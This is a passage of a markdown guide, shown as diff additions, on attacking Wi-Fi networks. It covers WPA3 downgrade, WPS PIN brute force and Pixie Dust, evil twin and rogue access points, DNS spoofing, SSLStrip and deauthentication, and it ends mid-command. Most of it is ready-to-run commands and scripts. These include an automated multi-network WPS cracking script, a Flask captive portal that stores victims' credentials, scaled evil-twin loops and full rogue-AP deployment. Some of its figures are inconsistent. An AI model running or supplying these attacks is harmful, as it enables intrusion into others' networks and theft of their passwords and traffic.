+hostapd -dd rogue_wpa2.conf
+
+# 4. Client connects to rogue WPA2 AP
+# Capture four-way handshake
+
+# 5. Dictionary attack on captured handshake
+aircrack-ng rogue_capture-01.cap -w wordlist.txt
+```
+
+[Inference] WPA3 transition mode vulnerabilities emerge from coexistence requirements, enabling attackers to isolate clients to less-secure WPA2 through deauthentication followed by rogue AP presentation.
+
+**WPA3 Enterprise (802.1X-Enterprise) Attacks**
+
+Target WPA3-Enterprise deployments:
+
+```bash
+# Enterprise WPA3 uses 802.1X with EAP authentication
+# More complex than PSK, but additional vectors exist
+
+# 1. Rogue RADIUS server creation
+# Set up fake radius server at attacker-controlled AP
+
+hostapd -dd enterprise_rogue.conf
+
+# enterprise_rogue.conf excerpt:
+# interface=wlan0
+# ssid=CorporateWiFi
+# wpa=3
+# wpa_key_mgmt=WPA-EAP
+# ieee8021x=1
+# eap_server=1
+# eap_user_file=/etc/hostapd/eap_users
+
+# 2. EAP method downgrade
+# Force clients to use weaker EAP variants (EAP-MD5, LEAP)
+
+# 3. Certificate capture and analysis
+# Enterprise WPA3 may use server certificate
+# MITM positioning enables certificate interception
+
+tcpdump -i wlan0 -w enterprise_capture.pcap "port 1812 or port 1813 or port 443"
+
+# 4. Credential harvesting through fake login
+# Rogue RADIUS may capture credentials before rejection
+
+# 5. RADIUS server compromise (backend attack)
+# Direct infrastructure compromise outside WiFi scope
+```
+
+[Unverified] WPA3-Enterprise attacks typically require [Inference] network positioning and infrastructure targeting rather than pure WiFi protocol exploitation, making practical attacks more complex than consumer WPA3-Personal.
+
+---
+
+## WPS PIN Attacks
+
+WPS (WiFi Protected Setup) PIN attacks exploit weak default PIN implementations and brute-force mechanisms, enabling rapid AP compromise without password knowledge through 8-digit PIN recovery.
+
+**WPS Detection and Enumeration**
+
+Identify WPS-enabled access points:
+
+```bash
+# WPS detection via passive scanning
+airodump-ng wlan0 | grep -i "WPS"
+
+# Detailed WPS identification
+airodump-ng -w wps_scan wlan0
+
+# WPS Information from beacons/probe responses
+tcpdump -i wlan0 -nn "wlan.type == 0 and wlan.subtype == 8" -w beacons.pcap
+
+# Analyze captured beacons for WPS IE
+tshark -r beacons.pcap -Y "wps" -V | grep -E "WPS|PIN|Version|State"
+
+# Specific WPS enumeration tools
+wash -i wlan0
+wash -i wlan0 -2  # 2.4GHz only
+wash -i wlan0 -5  # 5GHz only
+```
+
+WPS indicators in beacon analysis:
+
+- **WPS IE present**: Access point supports WPS
+- **PIN locked**: AP has locked WPS after failed attempts
+- **Version**: WPS protocol version (1.0, 2.0)
+- **State**: Not Configured, Configured
+
+[Inference] WPS identification through beacon analysis reveals AP capabilities and configuration state, enabling targeted attacks against vulnerable implementations.
+
+**WPS PIN Brute-Force Attack**
+
+Systematically attempt all possible WPS PIN combinations:
+
+```bash
+# Using Reaver - dedicated WPS attack tool
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv
+# -i: Monitor mode interface
+# -b: Target AP BSSID
+# -vv: Verbose output
+
+# Accelerated brute-force
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF --no-nacks -N -d 0 -T 1 -c 1 -vv
+# --no-nacks: Ignore nack responses
+# -N: Never deauthenticate
+# -d 0: Delay between attempts (0ms)
+# -T 1: Timeout for associate (1 second)
+# -c 1: Channel (1-13)
+
+# Output displays PIN recovery progress
+# [+] PIN recovered: 12345670
+# [+] WPA PSK: 'NetworkPassword'
+```
+
+WPS PIN structure:
+
+```
+PIN format: XXXXXXXX (8 digits)
+First 7 digits: Random or derived
+8th digit: Checksum (sum of first 7 mod 10)
+Space: 10,000,000 possible PINs (7 digits) → ~10 million attempts
+```
+
+[Inference] WPS PIN brute-force requires average 5 million attempts (half the space), achievable in hours-days depending on AP processing speed and network interference.
+
+**WPS PIN Cracking Process Analysis**
+
+Understand WPS authentication process exploitation:
+
+```bash
+# WPS exchange sequence:
+
+# 1. Probe request with WPS IE
+# AP responds with WPS capability
+
+# 2. M1-M8 messages (registration protocol)
+# Client and AP exchange device information and nonce
+
+# 3. PIN validation
+# AP verifies submitted PIN via hash comparison
+
+# 4. Key delivery (if PIN correct)
+# AP transmits WPA2 credentials (SSID, password)
+
+# Brute-force optimization:
+
+# - WPS typically validates PIN in two halves
+#   First 4 digits tested, then second 4 digits
+#   Reduces complexity to ~11,000 attempts max
+
+# Reaver utilizes this by:
+# 1. Brute-forcing first half: 0000-9999 (~10,000 attempts)
+# 2. Upon success, brute-force second half: 0000-9999
+# 3. Calculate 8th digit (checksum)
+
+# Time optimization:
+# Average 5-6 hours for complete PIN recovery
+# With optimizations: 2-4 hours
+# Newer AP implementations: 24+ hours (enforced delays)
+```
+
+[Inference] Two-stage WPS PIN validation reduces brute-force complexity from 10 million to ~20,000 attempts, enabling practical attacks against WPS implementations.
+
+**WPS Pixie Dust Attack**
+
+Exploit WPS entropy weaknesses for rapid PIN recovery:
+
+```bash
+# Pixie Dust attack targets weak random number generation
+# in WPS implementation
+
+# Using Pixiewps tool
+pixiewps --help
+pixiewps -e <encrypted_settings> -s <serial> -z <mac> -n <nonce> --verbose
+
+# Pixiewps requires:
+# - Encrypted WPS settings (from M7 message)
+# - AP serial number
+# - AP MAC address
+# - Nonce value (from WPS exchange)
+
+# Reaver with Pixiewps integration
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -K
+# -K: Enable Pixiewps integration
+
+# Pixiewps analysis process:
+# 1. Identifies weak RNG patterns
+# 2. Predicts likely PIN values
+# 3. Tests predictions against AP
+
+# Output if vulnerable:
+# [*] Pixiewps found likely PIN: 12345670
+# [+] Time: <5 minutes
+
+# Common vulnerable APs:
+# - Older Linksys models
+# - Some TP-Link implementations
+# - First-generation consumer routers
+```
+
+[Inference] Pixie Dust attacks reduce recovery time from hours to minutes when AP implements weak random number generation, though modern implementations use cryptographically-secure RNG preventing this attack.
+
+**WPS Timeout and Rate-Limiting Bypass**
+
+Overcome AP protections against brute-force attacks:
+
+```bash
+# Modern APs implement rate limiting:
+
+# 1. Exponential backoff: Delays increase after failed attempts
+# 2. PIN lockout: Disable WPS after N failed attempts
+# 3. Association timeout: Force re-association between attempts
+
+# Bypass techniques:
+
+# Delay manipulation
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -d <delay> --timeout <timeout>
+# Adjust delays to match AP's minimum required interval
+
+# Rate limiting bypass
+# Space attempts across multiple sessions
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF --no-nacks -N
+# --no-nacks: Don't interpret timeouts as failures
+
+# Association reset
+# Re-associate between attempts to reset timeout counters
+for pin in {00000000..99999999}; do
+    aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
+    # Fake authentication
+    reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -p "$pin" --no-associate
+    sleep 1
+done
+
+# Alternate MAC spoofing
+# Use different MAC addresses across attempts
+macchanger -r wlan0
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF ...
+```
+
+[Unverified] Rate limiting bypass effectiveness depends on [Inference] specific AP implementation and protections—some implementations enforce hardware-level delays preventing bypass, while others rely on software delays circumventable through manipulation.
+
+**WPS PIN Lock Recovery**
+
+Bypass WPS PIN lockout protection:
+
+```bash
+# After failed attempts, APs lock WPS functionality
+# Lock duration: typically 1-24 hours
+
+# Bypass techniques:
+
+# 1. Wait for automatic unlock
+# Passive bypass - not practical for time-sensitive scenarios
+
+# 2. Factory reset
+# Physical reset button or recovery mechanism
+# Resets lockout but loses configuration
+
+# 3. AP reboot exploitation
+# Reboot may clear lockout counter
+aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0
+# Deauthenticate all clients
+# Power cycle may follow from client perspective
+
+# Monitor for AP reboot
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w reboot_monitor wlan0
+# Look for beacon interval reset or timing changes
+
+# Resume attack after reboot
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv
+
+# 4. Bypass via client-side attacks
+# Some APs unlock WPS for specific client MACs
+# Spoof authorized MAC addresses if discoverable
+```
+
+[Inference] WPS PIN lock protections significantly slow brute-force attacks but don't prevent them entirely—combination of multiple evasion techniques enables eventual PIN recovery with patience.
+
+**WPS Default PIN Recovery**
+
+Target APs using manufacturer default PINs:
+
+```bash
+# Many APs ship with default or predictable PINs
+
+# Common default PINs by manufacturer:
+# Linksys: 12345670
+# TP-Link: 12345670
+# ASUS: 12345670
+# Netgear: Typically random, occasionally 12345670
+
+# Create wordlist of common PINs
+cat > default_pins.txt << 'EOF'
+12345670
+00000000
+11111111
+88888888
+99999999
+EOF
+
+# Test common PINs before brute-force
+reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -p 12345670 -N
+# -p: Specify PIN
+
+# If success:
+# [+] WPA PSK: 'Password'
+# Credentials compromised
+
+# Combined approach: Default → Pixiewps → Brute-force
+# 1. Test manufacturer defaults (seconds)
+# 2. Attempt Pixie Dust (5-30 minutes)
+# 3. Full brute-force if previous fail (hours-days)
+```
+
+[Inference] Default PIN attacks provide fastest initial access vector, with manufacturer defaults enabling AP compromise in seconds when not changed during initial setup.
+
+**WPS Credential Extraction**
+
+Parse and utilize recovered WPA2 credentials:
+
+```bash
+# Reaver outputs recovered credentials:
+# [+] WPA PSK: 'NetworkPassword'
+# [+] AP PIN: '12345670'
+
+# Extract from Reaver logs
+grep "WPA PSK" /usr/local/etc/reaver/reaver.log
+
+# WPS delivers encrypted credentials in M7 message
+# Reaver automatically decrypts upon PIN success
+
+# Verify credentials
+# Connect using recovered password
+nmcli device wifi connect "TargetSSID" password "NetworkPassword"
+
+# Alternative connection verification
+wpa_supplicant -i wlan0 -c wpa_config.conf -d
+
+# wpa_config.conf:
+# network={
+#     ssid="TargetSSID"
+#     psk="NetworkPassword"
+#     key_mgmt=WPA-PSK
+# }
+```
+
+[Inference] Successfully recovered credentials enable full network access, with WPS design inherently providing plaintext password delivery upon PIN authentication rather than requiring independent cracking.
+
+**WPS Attack Automation and Orchestration**
+
+Automate WPS attacks across multiple networks:
+
+```bash
+#!/bin/bash
+# Automated WPS attack framework
+
+TARGET_INTERFACE="wlan0"
+OUTPUT_DIR="./wps_results"
+BSSID_LIST="networks.txt"
+
+mkdir -p $OUTPUT_DIR
+
+# 1. Scan for WPS networks
+echo "[*] Scanning for WPS networks..."
+wash -i $TARGET_INTERFACE -o $OUTPUT_DIR/wps_networks.txt
+
+# 2. Process each WPS network
+while read bssid essid channel wps_state; do
+    echo "[*] Attacking: $essid ($bssid)"
+    
+    # 3. Attempt Pixiewps first
+    reaver -i $TARGET_INTERFACE -b $bssid -K -vv | tee $OUTPUT_DIR/${bssid}_pixiewps.log &
+    PID=$!
+    
+    # Timeout after 10 minutes (or until success)
+    sleep 600
+    kill $PID 2>/dev/null
+    
+    # Check for success
+    if grep -q "WPA PSK" $OUTPUT_DIR/${bssid}_pixiewps.log; then
+        echo "[+] Credentials recovered!"
+        grep "WPA PSK" $OUTPUT_DIR/${bssid}_pixiewps.log >> $OUTPUT_DIR/credentials.txt
+        continue
+    fi
+    
+    # 4. Fall back to full brute-force
+    echo "[*] Starting PIN brute-force..."
+    reaver -i $TARGET_INTERFACE -b $bssid -N --no-nacks -d 0 -T 1 -vv | tee $OUTPUT_DIR/${bssid}_bruteforce.log &
+    PID=$!
+    
+    # Monitor progress
+    while kill -0 $PID 2>/dev/null; do
+        if grep -q "WPA PSK" $OUTPUT_DIR/${bssid}_bruteforce.log; then
+            echo "[+] PIN cracked!"
+            grep -E "PIN|WPA PSK" $OUTPUT_DIR/${bssid}_bruteforce.log >> $OUTPUT_DIR/credentials.txt
+            break
+        fi
+        sleep 60
+    done
+    
+done < $OUTPUT_DIR/wps_networks.txt
+
+echo "[*] Attack complete. Results in $OUTPUT_DIR/credentials.txt"
+```
+
+[Inference] Automated WPS attacks enable large-scale wireless network compromise, with multiple networks attacked in parallel during extended operations.
+
+---
+
+## Evil Twin Attacks
+
+Evil Twin attacks establish rogue access points mimicking legitimate networks, enabling MITM positioning, credential harvesting, malware distribution, and network segmentation bypass through client association to attacker-controlled infrastructure.
+
+**Rogue Access Point Creation**
+
+Establish fake network infrastructure:
+
+```bash
+# Configure AP interface
+airmon-ng start wlan0
+# Creates wlan0mon
+
+# Create hostapd configuration
+cat > evil_twin.conf << 'EOF'
+interface=wlan0mon
+driver=nl80211
+ssid=FreeWiFi
+channel=6
+hw_mode=g
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+
+# No WPA (Open network)
+# For WPA2: add authentication parameters
+wpa=2
+wpa_passphrase=password123
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+EOF
+
+# Launch rogue AP
+hostapd -dd evil_twin.conf
+
+# Alternative using create_ap wrapper
+create_ap wlan0mon eth0 FreeWiFi password123
+# wlan0mon: WiFi interface
+# eth0: Upstream internet (or use --no-internet)
+# SSID: Network name
+# Password: WPA2 password
+```
+
+**SSID Cloning and Beacon Spoofing**
+
+Clone legitimate networks to fool clients:
+
+```bash
+# Identify target network
+airodump-ng wlan0 -w target_scan
+
+# Extract SSID, BSSID, channel
+cat > evil_twin_clone.conf << 'EOF'
+interface=wlan0mon
+driver=nl80211
+ssid=LegitimateNetwork     # Clone victim SSID
+channel=6                   # Match victim channel
+hw_mode=g
+bssid=AA:BB:CC:DD:EE:01     # Slightly different MAC
+wmm_enabled=0
+
+# Match encryption of victim
+wpa=2
+wpa_passphrase=commonpassword
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+EOF
+
+hostapd -dd evil_twin_clone.conf
+
+# Clients confused by two identical SSIDs on same channel
+# Client behavior depends on signal strength and BSSID preference
+
+# Monitor client association
+tcpdump -i wlan0mon -nn "wlan.fc.subtype == 0" | grep -i "auth\|assoc"
+
+# Track associations to rogue AP
+iw dev wlan0mon station dump
+# Displays connected clients and signal strength
+```
+
+[Inference] SSID cloning creates ambiguity for clients attempting to reconnect to preferred networks, with association success depending on relative signal strength and client supplicant behavior.
+
+**Client Deauthentication and Association**
+
+Force clients to connect to rogue AP:
+
+```bash
+# Identify target clients
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w client_scan wlan0
+
+# Deauthenticate from legitimate AP
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0
+# Forces client re-association to any available AP
+
+# Launch rogue AP simultaneously
+# Stronger signal = higher association probability
+# Geolocation near client = higher success rate
+
+# Monitor rogue AP for client connections
+hostapd_cli -i wlan0mon status
+
+# Track associated clients
+iw dev wlan0mon station dump | grep -E "Station|signal"
+
+# Output shows connected clients on rogue AP
+```
+
+[Inference] Deauthentication combined with rogue AP presentation near clients enables high-probability association to attacker infrastructure, particularly when rogue signal exceeds legitimate AP strength.
+
+**DNS Spoofing and MITM Attacks**
+
+Intercept and manipulate client traffic:
+
+```bash
+# Enable IP forwarding for transparent bridging
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Configure DHCP on rogue AP
+cat > dhcpd.conf << 'EOF'
+subnet 192.168.100.0 netmask 255.255.255.0 {
+    range 192.168.100.50 192.168.100.200;
+    option domain-name-servers 192.168.100.1;
+    option routers 192.168.100.1;
+    default-lease-time 600;
+    max-lease-time 7200;
+}
+EOF
+
+dnsmasq -C dhcpd.conf -d
+
+# DNS spoofing via dnsmasq
+# Add to dhcpd.conf:
+# address=/facebook.com/192.168.100.1
+# address=/google.com/192.168.100.1
+# Redirects all DNS queries to attacker IP
+
+# MITM with iptables
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
+
+# HTTP/HTTPS interception proxy
+mitmproxy -p 8080 --mode transparent
+
+# Monitor intercepted traffic
+tcpdump -i wlan0mon -w evil_traffic.pcap
+```
+
+[Inference] MITM positioning enables complete traffic manipulation—credential theft, malware injection, content modification—dependent only on attacker technical capability and target's acceptance of self-signed certificates.
+
+**Credential Harvesting Through Rogue AP**
+
+Capture client credentials:
+
+```bash
+# 1. Fake login portal (HTTP interception)
+# Redirect all HTTP traffic to attacker-controlled page
+
+cat > fake_login.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head><title>WiFi Authentication</title></head>
+<body>
+<h2>Connect to WiFi</h2>
+<form method="POST" action="/login">
+    Username: <input type="text" name="user"><br>
+    Password: <input type="password" name="pass"><br>
+    <input type="submit" value="Connect">
+</form>
+</body>
+</html>
+EOF
+
+python3 -m http.server 80
+
+# 2. Capture HTTP POST data
+tcpdump -i wlan0mon -A "tcp port 80 and (((ip[2:2] - ((ip[0]&xf)<<2)) - ((tcp[12]&xf0)>>2)) != 0)" | grep -oE "user=.*&pass=.*" | head -20
+
+# 3. Email credential harvesting
+# Intercept IMAP/SMTP login attempts
+tcpdump -i wlan0mon -A "tcp port 143 or tcp port 25" | grep -iE "login|auth|user|pass"
+
+# 4. HTTPS interception (self-signed certificate)
+# mitmproxy intercepts HTTPS if client accepts invalid cert
+# Many clients auto-accept on captive portals
+
+mitmproxy -p 8443 --mode transparent --cert /path/to/selfsigned.pem
+
+# Monitor flow data for credentials
+mitmproxy interactive interface shows all intercepted HTTP/HTTPS requests
+```
+
+[Inference] Credential harvesting success depends on client behavioral exploitation—users attempting to access familiar services (email, social media) may submit credentials to rogue portals expecting authentication.
+
+**Evil Twin with WPA2 Impersonation**
+
+Establish WPA2-protected rogue AP requiring password entry:
+
+```bash
+# Create WPA2-protected evil twin
+cat > evil_wpa2.conf << 'EOF'
+interface=wlan0mon
+driver=nl80211
+ssid=CorporateWiFi
+channel=6
+hw_mode=g
+
+# WPA2 configuration
+wpa=2
+wpa_passphrase=WeakPassword123
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+
+# Enable debugging
+debug=1
+EOF
+
+hostapd -dd evil_wpa2.conf
+
+# Clients associating with rogue AP must know WPA2 password
+# If password publicly known or easily guessed: automatic association
+# If password unknown: captive portal redirect after association
+
+# Hybrid approach:
+# - Open network with SSID cloning
+# - Prompt for "password" to continue
+# - Actually requesting credentials
+
+cat > password_portal.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head><title>WiFi Password Required</title></head>
+<body>
+<h3>Enter WiFi Password</h3>
+<form method="POST" action="/auth">
+    <input type="password" name="password" placeholder="WiFi Password">
+    <input type="submit" value="Connect">
+</form>
+</body>
+</html>
+EOF
+```
+
+[Inference] WPA2-protected rogue APs create authentic-appearing networks with transparent encryption, reducing client suspicion while enabling MITM attacks through complete credential possession.
+
+**Evil Twin Detection and Avoidance**
+
+Identify and prevent rogue AP compromise:
+
+```bash
+# Detection methods:
+
+# 1. BSSID monitoring
+# Legitimate AP BSSIDs rarely change
+# Sudden BSSID change indicates rogue AP
+
+# 2. Signal strength analysis
+# Compare RSSI (signal strength) consistency
+# Rapid fluctuation indicates multiple APs
+
+# 3. Certificate analysis
+# Check HTTPS certificate validity
+# Self-signed or mismatched domain = rogue AP
+openssl s_client -connect suspicious_ap:443 -showcerts
+
+# 4. HTTPS-Everywhere enforcement
+# Prevents HTTP downgrade attacks
+# Browser extensions ensure encryption
+
+# 5. VPN usage
+# Encrypts all traffic regardless of AP compromise
+# Masks DNS queries and HTTP traffic
+
+# 6. MAC filtering
+# Whitelist known legitimate AP BSSIDs
+# Reject connections to unknown BSSIDs
+
+# 7. Client behavior analysis
+# Monitor for unexpected network changes
+# Alert on new network connection attempts
+```
+
+[Inference] Evil Twin detection relies on behavioral analysis and certificate validation rather than wireless-specific mechanisms, requiring user awareness and endpoint security controls.
+
+**Evil Twin With Captive Portal**
+
+Implement sophisticated credential capture:
+
+```bash
+# Create advanced captive portal
+
+cat > portal_server.py << 'EOF'
+from flask import Flask, render_template, request, redirect
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route('/')
+def portal():
+    # Redirect all traffic to portal
+    return render_template('portal.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    # Store credentials
+    conn = sqlite3.connect('credentials.db')
+    conn.execute('INSERT INTO credentials VALUES (?, ?)', (username, password))
+    conn.commit()
+    
+    # Perform RADIUS authentication check (legitimate or fake)
+    if authenticate(username, password):
+        return redirect('http://www.google.com')  # "Success" page
+    else:
+        return render_template('portal.html', error='Invalid credentials')
+
+def authenticate(user, password):
+    # Connect to real RADIUS server or fake acceptance
+    return True  # All credentials accepted
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
+EOF
+
+python3 portal_server.py
+
+# Configure iptables to redirect all HTTP to portal
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
+
+# HTTPS redirection (requires certificate)
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
+```
+
+[Inference] Advanced captive portals provide credential validation feedback and internet access simulation, increasing user legitimacy perception and credential harvesting effectiveness.
+
+**Evil Twin Distribution and Scale**
+
+Expand rogue AP attacks across large areas:
+
+```bash
+# Multiple simultaneous evil twins
+# Each targeting different SSIDs or channels
+
+# Distribution script
+for ssid in $(cat target_ssids.txt); do
+    for channel in {1,6,11}; do
+        # Create AP config dynamically
+        cat > /tmp/evil_$channel.conf << EOF
+interface=wlan${channel}mon
+ssid=$ssid
+channel=$channel
+# ... additional config
+EOF
+        
+        # Launch AP
+        hostapd -dd /tmp/evil_$channel.conf &
+    done
+done
+
+# Monitor all APs simultaneously
+for interface in wlan0mon wlan1mon wlan2mon; do
+    tcpdump -i $interface -w /tmp/evil_$interface.pcap &
+done
+
+# Aggregate captured credentials
+cat /tmp/evil_*.pcap | tcpdump -r - -A "tcp port 80" | grep -oE "user=.*&pass=.*"
+```
+
+[Inference] Distributed evil twin attacks enable large-scale credential harvesting from multiple networks simultaneously, requiring adequate wireless hardware (multiple adapters) and computational resources.
+
+**Evil Twin Network Segmentation Bypass**
+
+Use rogue AP for internal network access:
+
+```bash
+# Scenario: Corporate network with guest WiFi isolation
+# Guest WiFi isolated from internal resources
+
+# Attack procedure:
+
+# 1. Clone internal SSID (CorporateWiFi)
+# 2. Create rogue AP with higher signal strength
+# 3. Clients associate with rogue instead of internal
+
+# 4. Rogue AP bridges to attacker's infrastructure
+# Attacker establishes MITM position
+
+# 5. Clients believe connected to internal network
+# Actually traffic flows through attacker
+
+# 6. Attacker pivots to internal resources
+# Lateral movement from guest to corporate segment
+
+# Mitigation: VPN enforcement
+# Corporate devices required to use VPN
+# Encryption prevents MITM attacks
+
+# Detection: Network monitoring
+# Unusual internal traffic patterns
+# Clients accessing restricted resources from guest segment
+```
+
+[Inference] Evil Twin network segmentation bypass relies on client trust exploitation and MITM positioning rather than wireless protocol vulnerabilities, enabling [Inference] lateral movement when users assume network safety based on SSID alone.
+
+---
+
+## Rogue Access Point Setup
+
+A rogue access point (AP) masquerades as a legitimate wireless network, intercepting traffic from clients that connect to it. This attack is effective in environments where users connect to networks with familiar SSIDs or in scenarios with weak SSID broadcasting security.
+
+**Hardware Requirements and Selection**
+
+Rogue AP deployment requires compatible wireless hardware:
+
+```bash
+# Check wireless adapter capabilities
+iwconfig
+iw phy
+iw list | grep -A 20 "Supported interface modes"
+
+# Verify monitor mode support
+airmon-ng check
+iwconfig wlan0 mode monitor
+
+# Verify AP mode support
+iw phy phy0 info | grep "AP"
+```
+
+Essential hardware characteristics:
+
+- Monitor mode support (packet capture and injection)
+- AP (access point) mode support
+- Sufficient transmit power for coverage area
+- Dual-band capability (2.4GHz and 5GHz) for advanced scenarios
+
+**Monitor Mode Activation**
+
+Enable wireless adapter in monitor mode:
+
+```bash
+# Identify wireless interface
+iwconfig
+
+# Disable network management interference
+sudo systemctl stop NetworkManager
+sudo systemctl stop wpa_supplicant
+
+# Switch to monitor mode
+sudo airmon-ng start wlan0
+# Creates mon0 interface
+
+# Manual monitor mode activation
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+
+# Verify monitor mode
+iwconfig wlan0 | grep Mode
+```
+
+**Hostapd Configuration for Rogue AP**
+
+Configure hostapd to broadcast rogue access point:
+
+```bash
+cat > /etc/hostapd/hostapd.conf << 'EOF'
+# Basic AP configuration
+interface=wlan0
+driver=nl80211
+ssid=FreeWiFi
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+
+# WPA2 encryption (optional for open network attack)
+wpa=2
+wpa_passphrase=DefaultPassword123
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+
+# Beacon interval
+beacon_int=100
+
+# Allow stations
+max_num_sta=100
+
+# Fragment threshold
+fragm_threshold=2346
+
+# RTS threshold
+rts_threshold=2347
+EOF
+
+# Launch hostapd
+sudo hostapd /etc/hostapd/hostapd.conf -dd
+```
+
+**DHCP Server Configuration**
+
+Configure dnsmasq to provide DHCP and DNS services:
+
+```bash
+cat > /etc/dnsmasq.conf << 'EOF'
+# DHCP configuration
+interface=wlan0
+dhcp-range=192.168.100.10,192.168.100.250,12h
+dhcp-option=option:router,192.168.100.1
+dhcp-option=option:dns-server,192.168.100.1
+
+# DNS configuration
+address=/#/192.168.100.1
+listen-address=192.168.100.1
+
+# Log queries
+log-queries
+log-facility=/var/log/dnsmasq.log
+EOF
+
+# Start dnsmasq
+sudo dnsmasq -C /etc/dnsmasq.conf
+```
+
+**IP Address and Network Configuration**
+
+Configure attacking system IP addressing:
+
+```bash
+# Assign IP to AP interface
+sudo ip addr add 192.168.100.1/24 dev wlan0
+sudo ip link set wlan0 up
+
+# Enable IP forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Configure iptables for traffic interception
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i wlan0 -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -j ACCEPT
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.100.1
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 192.168.100.1
+```
+
+**SSL Strip and HTTPS Downgrade**
+
+Intercept HTTPS traffic by stripping SSL/TLS:
+
+```bash
+# Install SSLStrip
+sudo apt-get install sslstrip
+
+# Configure iptables to redirect HTTPS to SSLStrip
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+# Launch SSLStrip
+sslstrip -l 8080 -w /var/log/sslstrip.log
+
+# Monitor captured credentials
+tail -f /var/log/sslstrip.log
+```
+
+**mitmproxy for Traffic Inspection**
+
+Deploy mitmproxy to capture and modify HTTP/HTTPS traffic:
+
+```bash
+# Install mitmproxy
+sudo apt-get install mitmproxy
+
+# Configure iptables for mitmproxy interception
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8443
+
+# Launch mitmproxy
+mitmproxy -p 8080 --mode transparent --showhost
+
+# Or use mitmdump for scripting
+mitmdump -p 8080 --mode transparent --showhost -w captured_traffic.mitm
+```
+
+**Automated Rogue AP Deployment**
+
+Script-based rogue AP setup for efficiency:
+
+```bash
+#!/bin/bash
+# rogue_ap_setup.sh
+
+INTERFACE="wlan0"
+SSID="CorporateGuest"
+IP_ADDR="192.168.100.1"
+DHCP_RANGE="192.168.100.10,192.168.100.250"
+
+echo "[*] Setting up rogue AP..."
+
+# Stop conflicting services
+sudo systemctl stop NetworkManager
+sudo systemctl stop wpa_supplicant
+
+# Enable monitor mode
+sudo airmon-ng start $INTERFACE
+
+# Configure IP
+sudo ip addr add $IP_ADDR/24 dev $INTERFACE
+sudo ip link set $INTERFACE up
+
+# Start dnsmasq
+sudo dnsmasq -C /etc/dnsmasq.conf
+
+# Enable IP forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Configure iptables
+sudo iptables -F
+sudo iptables -t nat -F
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i $INTERFACE -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -j ACCEPT
+sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $IP_ADDR
+sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j DNAT --to-destination $IP_ADDR
+
+# Launch hostapd
+sudo hostapd /etc/hostapd/hostapd.conf -d &
+
+# Launch mitmproxy
+mitmproxy -p 8080 --mode transparent --showhost -w captured_traffic.mitm &
+
+echo "[+] Rogue AP deployed on $SSID"
+```
+
+**Evil Twin Attack (SSID Cloning)**
+
+Create AP with identical SSID to legitimate network:
+
+```bash
+# Scan for target network BSSID and channel
+sudo airodump-ng wlan0 | grep "TargetSSID"
+
+# Configure hostapd with matching BSSID
+cat > /etc/hostapd/hostapd_twin.conf << 'EOF'
+interface=wlan0
+driver=nl80211
+ssid=TargetSSID
+hwmode=g
+channel=6
+bssid=AA:BB:CC:DD:EE:FF
+# Match target BSSID
+
+# Open network
+auth_algs=1
+wpa=0
+EOF
+
+# Deploy evil twin
+sudo hostapd /etc/hostapd/hostapd_twin.conf
+```
+
+[Inference] In environments with multiple APs on same SSID, clients may connect to strongest signal. Rogue AP with higher transmit power attracts clients from legitimate network.
+
+**De-authentication Attack (Forced Roaming)**
+
+Force clients to disconnect from legitimate AP and connect to rogue:
+
+```bash
+# Identify target network
+sudo airodump-ng wlan0 -c 6 -w capture
+
+# Launch de-authentication flood
+sudo aireplay-ng -0 0 -a [TARGET_BSSID] wlan0
